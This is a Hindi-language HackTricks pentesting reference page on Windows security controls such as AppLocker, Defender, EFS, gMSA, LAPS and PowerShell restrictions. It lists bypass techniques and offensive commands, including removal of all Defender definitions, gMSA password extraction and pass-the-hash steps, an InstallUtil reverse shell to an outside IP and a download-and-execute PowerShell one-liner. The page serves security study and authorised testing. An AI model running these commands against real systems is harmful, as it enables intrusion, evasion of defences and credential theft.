# Windows सुरक्षा नियंत्रण

{{#include ../../banners/hacktricks-training.md}}

## AppLocker Policy

Application whitelist स्वीकृत software applications या executables की एक सूची होती है, जिन्हें system पर मौजूद रहने और चलने की अनुमति होती है। इसका लक्ष्य environment को हानिकारक malware और ऐसे unapproved software से सुरक्षित रखना है, जो किसी organization की विशिष्ट business needs के अनुरूप नहीं होते।

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) Microsoft का **application whitelisting solution** है और system administrators को यह नियंत्रित करने की सुविधा देता है कि **users कौन-से applications और files चला सकते हैं**। यह executables, scripts, Windows installer files, DLLs, packaged apps और packed app installers पर **granular control** प्रदान करता है।\
Organizations के लिए **cmd.exe और PowerShell.exe को block करना** और कुछ directories पर write access रोकना आम बात है, **लेकिन इन सभी प्रतिबंधों को bypass किया जा सकता है**।

### जाँचें

देखें कि कौन-सी files/extensions blacklisted/whitelisted हैं:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
यह registry path AppLocker द्वारा लागू की गई configurations और policies को रखता है, जिससे system पर लागू वर्तमान rules की समीक्षा की जा सकती है:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy को bypass करने के लिए उपयोगी **Writable folders**: यदि AppLocker `C:\Windows\System32` या `C:\Windows` के अंदर किसी भी चीज़ को execute करने की अनुमति दे रहा है, तो कुछ **writable folders** हैं जिनका उपयोग आप **इसे bypass करने** के लिए कर सकते हैं।
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- आम तौर पर **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries AppLocker को bypass करने में भी उपयोगी हो सकती हैं।
- **खराब तरीके से लिखे गए rules को भी bypass किया जा सकता है**
- उदाहरण के लिए, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** के मामले में, आप कहीं भी **`allowed` नाम का folder** बना सकते हैं और उसे अनुमति मिल जाएगी।
- Organizations अक्सर `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable को **block करने** पर ध्यान केंद्रित करती हैं, लेकिन अन्य **[**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)** को भूल जाती हैं, जैसे `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` या `PowerShell_ISE.exe`।
- **DLL enforcement बहुत कम ही enabled होता है**, क्योंकि इससे system पर अतिरिक्त load पड़ सकता है और यह सुनिश्चित करने के लिए काफी testing की आवश्यकता होती है कि कुछ भी खराब न हो। इसलिए **DLLs को backdoors के रूप में उपयोग करने से AppLocker bypass करने में मदद मिलेगी**।
- आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग किसी भी process में **Powershell** code **execute** करने और AppLocker bypass करने के लिए कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)।<sup>[[4]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

Local credentials इस file में मौजूद होते हैं, passwords hashed होते हैं।

### Local Security Authority (LSA) - LSASS

Single Sign-On कारणों से **credentials** (hashed) इस subsystem की **memory** में **saved** रहते हैं।\
**LSA** local **security policy** (password policy, users permissions...), **authentication**, **access tokens** आदि को administrate करता है।\
LSA ही **local login** के लिए **SAM** file में दिए गए credentials को **check** करेगा और domain user को authenticate करने के लिए **domain controller** से **talk** करेगा।

**Credentials** **process LSASS** के अंदर **saved** रहते हैं: Kerberos tickets, NT और LM hashes, आसानी से decrypted passwords।

### LSA secrets

LSA कुछ credentials को disk पर save कर सकता है:

- Active Directory के computer account का password (unreachable domain controller)।
- Windows services के accounts के passwords
- Scheduled tasks के passwords
- अन्य (IIS applications का password...)

### NTDS.dit

यह Active Directory का database है। यह केवल Domain Controllers में मौजूद होता है।

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) एक Antivirus है, जो Windows 10 और Windows 11 तथा Windows Server के versions में उपलब्ध है। यह **`WinPEAS`** जैसे सामान्य pentesting tools को **block** करता है। हालांकि, इन **protections को bypass** करने के तरीके मौजूद हैं।

### Check

**Defender** का **status** check करने के लिए आप PS cmdlet **`Get-MpComputerStatus`** execute कर सकते हैं (यह जानने के लिए **`RealTimeProtectionEnabled`** की value check करें कि यह active है या नहीं):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

इसे enumerate करने के लिए आप यह भी run कर सकते हैं:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS फाइलों को encryption के माध्यम से सुरक्षित करता है और इसके लिए **File Encryption Key (FEK)** नामक **symmetric key** का उपयोग करता है। यह key उपयोगकर्ता की **public key** से encrypted होकर encrypted file के $EFS **alternative data stream** में संग्रहीत रहती है। जब decryption की आवश्यकता होती है, तो उपयोगकर्ता के digital certificate की संबंधित **private key** का उपयोग $EFS stream से FEK को decrypt करने के लिए किया जाता है। अधिक विवरण [यहां](https://en.wikipedia.org/wiki/Encrypting_File_System) मिल सकता है।

**उपयोगकर्ता की पहल के बिना होने वाले decryption scenarios** में शामिल हैं:

- जब files या folders को [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) जैसे non-EFS file system में move किया जाता है, तो वे automatically decrypt हो जाती हैं।
- SMB/CIFS protocol के माध्यम से network पर भेजी जाने वाली encrypted files transmission से पहले decrypt हो जाती हैं।

यह encryption method owner को encrypted files तक **transparent access** प्रदान करता है। हालांकि, केवल owner का password बदलकर login करने से decryption की अनुमति नहीं मिलेगी।

**मुख्य बातें**:

- EFS एक symmetric FEK का उपयोग करता है, जिसे उपयोगकर्ता की public key से encrypt किया जाता है।
- FEK तक पहुंचने के लिए decryption में उपयोगकर्ता की private key का उपयोग किया जाता है।
- FAT32 पर copying या network transmission जैसी specific conditions में automatic decryption होता है।
- Encrypted files owner के लिए बिना अतिरिक्त steps के accessible होती हैं।

### EFS info की जांच करें

जांचें कि किसी **user** ने इस **service** का **उपयोग** किया है या नहीं; इसके लिए देखें कि यह path मौजूद है या नहीं:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

cipher /c \<file\> का उपयोग करके जांचें कि file तक **किसके पास** **access** है।  
आप किसी folder के अंदर `cipher /e` और `cipher /d` का उपयोग करके सभी files को **encrypt** और **decrypt** भी कर सकते हैं।

### EFS files को decrypt करना

#### Being Authority System

इस तरीके के लिए आवश्यक है कि **victim user** host के अंदर कोई **process** **run** कर रहा हो। यदि ऐसा है, तो `meterpreter` sessions का उपयोग करके आप user के process के token को impersonate कर सकते हैं (`incognito` से `impersonate_token`)। या आप user के process में सीधे `migrate` कर सकते हैं।

#### User का password पता होना

Mimikatz यह बताता है कि user के certificate/private key material को import करके, password ज्ञात होने पर EFS-protected files को कैसे decrypt किया जाए।<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Microsoft ने IT infrastructures में service accounts के management को सरल बनाने के लिए **Group Managed Service Accounts (gMSA)** विकसित किए। Traditional service accounts के विपरीत, जिनमें अक्सर "**Password never expire**" setting enabled होती है, gMSAs अधिक secure और manageable solution प्रदान करते हैं:

- **Automatic Password Management**: gMSAs एक complex, 240-character password का उपयोग करते हैं, जो domain या computer policy के अनुसार automatically बदलता है। यह process Microsoft की Key Distribution Service (KDC) द्वारा handle की जाती है, जिससे manual password updates की आवश्यकता समाप्त हो जाती है।
- **Enhanced Security**: ये accounts lockouts से immune होते हैं और interactive logins के लिए उपयोग नहीं किए जा सकते, जिससे उनकी security बढ़ती है।
- **Multiple Host Support**: gMSAs को multiple hosts के बीच share किया जा सकता है, इसलिए ये multiple servers पर चलने वाली services के लिए ideal हैं।
- **Scheduled Task Capability**: managed service accounts के विपरीत, gMSAs scheduled tasks चलाने का support करते हैं।
- **Simplified SPN Management**: computer के sAMaccount details या DNS name में changes होने पर system automatically Service Principal Name (SPN) को update करता है, जिससे SPN management सरल हो जाता है।

gMSAs के passwords LDAP property _**msDS-ManagedPassword**_ में stored होते हैं और Domain Controllers (DCs) द्वारा हर 30 दिन में automatically reset किए जाते हैं। यह password, [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) के रूप में ज्ञात एक encrypted data blob है, जिसे केवल authorized administrators और उन servers द्वारा retrieve किया जा सकता है जिन पर gMSAs installed हैं, जिससे secure environment सुनिश्चित होता है। इस information तक access करने के लिए LDAPS जैसे secured connection की आवश्यकता होती है, या connection को 'Sealing & Secure' के साथ authenticated होना चाहिए।

![gMSA password retrieve करने के लिए NTLM authentication को relay करना](../../images/asd1.png)<sup>[[1]](#references)</sup>

आप इस password को [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup> से read कर सकते हैं।
```
/GMSAPasswordReader --AccountName jkohler
```
[**archived original research में अधिक जानकारी प्राप्त करें**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

वही research बताती है कि **NTLM relay attack** तब **gMSA password** प्राप्त कर सकता है, जब relayed principal को `msDS-ManagedPassword` पढ़ने की अनुमति हो।<sup>[[1]](#references)</sup>

### gMSA managed password पढ़ने के लिए ACL chaining का दुरुपयोग (GenericAll -> ReadGMSAPassword)

कई environments में, low-privileged users misconfigured object ACLs का दुरुपयोग करके DC compromise के बिना gMSA secrets तक pivot कर सकते हैं:<sup>[[3]](#references)</sup>

- जिस group को आप control कर सकते हैं (जैसे, GenericAll/GenericWrite के माध्यम से), उसे किसी gMSA पर `ReadGMSAPassword` दिया गया है।
- स्वयं को उस group में जोड़कर, आप LDAP के माध्यम से gMSA के `msDS-ManagedPassword` blob को पढ़ने और उपयोग योग्य NTLM credentials प्राप्त करने का अधिकार हासिल कर लेते हैं।

सामान्य workflow:

1) BloodHound से path खोजें और अपने foothold principals को Owned के रूप में mark करें। इस प्रकार के edges देखें:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) जिस intermediate group को आप control करते हैं, उसमें स्वयं को जोड़ें (bloodyAD के उदाहरण के साथ):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) LDAP के माध्यम से gMSA managed password पढ़ें और NTLM hash निकालें। NetExec `msDS-ManagedPassword` के extraction और उसे NTLM में conversion को automate करता है:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) NTLM hash का उपयोग करके gMSA के रूप में Authenticate करें (plaintext की आवश्यकता नहीं है)। यदि खाता Remote Management Users में है, तो WinRM सीधे काम करेगा:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
- `msDS-ManagedPassword` के LDAP reads के लिए sealing आवश्यक है (जैसे LDAPS/sign+seal)। Tools इसे अपने-आप संभालते हैं।
- gMSAs को अक्सर WinRM जैसे local rights दिए जाते हैं; lateral movement की योजना बनाने के लिए group membership (जैसे Remote Management Users) को validate करें।
- यदि आपको केवल NTLM की गणना स्वयं करने के लिए blob चाहिए, तो MSDS-MANAGEDPASSWORD_BLOB structure देखें।



## LAPS

**Local Administrator Password Solution (LAPS)**, जो [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) से download के लिए उपलब्ध है, local Administrator passwords के management को सक्षम बनाता है। ये passwords **randomized**, unique और **नियमित रूप से बदले जाने वाले** होते हैं तथा Active Directory में centrally store किए जाते हैं। इन passwords का access ACLs के माध्यम से authorized users तक restricted होता है। पर्याप्त permissions मिलने पर local admin passwords को read करने की ability प्राप्त हो जाती है।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) PowerShell को effectively use करने के लिए आवश्यक कई **features को lock down** करता है, जैसे COM objects को block करना, केवल approved .NET types की अनुमति देना, XAML-based workflows, PowerShell classes और बहुत कुछ।

### **जाँच**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
वर्तमान Windows versions पर वह bypass अब काम नहीं करता, लेकिन आप [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) का उपयोग कर सकते हैं।\
**इसे compile करने के लिए आपको** **to** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` जोड़ने और **project को .Net4.5 में बदलने** की आवश्यकता हो सकती है।

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग किसी भी process में **Powershell** code को **execute** करने और constrained mode को bypass करने के लिए कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)।<sup>[[4]](#references)</sup>

## PS Execution Policy

डिफ़ॉल्ट रूप से यह **restricted.** पर सेट होती है। इस policy को bypass करने के मुख्य तरीके:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
और अधिक जानकारी [यहाँ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup> मिल सकती है।

## Security Support Provider Interface (SSPI)

यह एक API है जिसका उपयोग users को authenticate करने के लिए किया जा सकता है।

SSPI दो communicating machines के लिए उपयुक्त authentication protocol चुनता है और उपलब्ध होने पर Kerberos को प्राथमिकता देता है। ये protocols Security Support Providers (SSPs) द्वारा implemented होते हैं, जो Windows पर DLLs के रूप में installed होते हैं; दोनों peers को negotiated provider support करना आवश्यक है।

### मुख्य SSPs

- **Kerberos**: प्राथमिक protocol
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** और **NTLMv2**: Compatibility reasons के लिए
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers और LDAP, password MD5 hash के रूप में
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL और TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: इसका उपयोग इस्तेमाल किए जाने वाले protocol को negotiate करने के लिए किया जाता है (Kerberos या NTLM, जिसमें Kerberos default है)
- %windir%\Windows\System32\lsasrv.dll

#### Negotiation कई methods या केवल एक method offer कर सकता है।

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक feature है जो **elevated activities के लिए consent prompt** सक्षम करता है।


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [gMSA के लिए Relaying – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: rights chaining के माध्यम से WinRM में gMSA](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – AppLocker और PowerShell Constrained Language Mode को Bypassing](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – PowerShell Execution Policy को Bypass करने के 15 तरीके](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ EFS files को decrypt करना](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
{{#include ../../banners/hacktricks-training.md}}
